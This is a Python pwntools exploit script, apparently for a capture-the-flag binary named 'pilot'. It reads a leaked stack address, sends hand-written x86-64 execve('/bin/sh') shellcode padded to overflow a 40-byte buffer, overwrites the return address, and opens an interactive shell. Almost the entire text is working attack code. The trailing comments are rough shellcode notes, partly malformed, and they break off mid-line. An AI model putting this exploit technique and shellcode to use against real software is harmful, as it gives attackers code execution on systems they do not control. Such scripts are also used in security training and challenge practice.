from pwn import *

target = process("./pilot")
target.recvuntil("Location:")
x= int(target.recvuntil("\n")[:-1],16)

string_of_bytes = hex_values = [
    0x31, 0xf6, 0x48, 0xbf, 0xd1, 0x9d, 0x96, 0x91,
    0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdf, 0xf7,
    0xe6, 0x04, 0x3b, 0x57, 0x54, 0x5f, 0x0f, 0x05
]

# Convert to bytes using to_bytes
shellcode = b''.join(x.to_bytes(1, byteorder='little') for x in hex_values)
payload = shellcode
payload += b"a" * (40 - len(shellcode))
payload += p64(x)
target.sendline(payload)

target.interactive()


# zero out RAX
# Zero out RDI
# zero out RSI
# zero out RDX
# put 59 in RAX (execve)
# put "/bin/sh/" in RDI
# \x31\xF6 xor zero ESI
# \x48\x31\xff xor zero rdi
# \xF7\x\4 zero mul esi RAX and RDX
# \x04\x3b add al, 59
# \x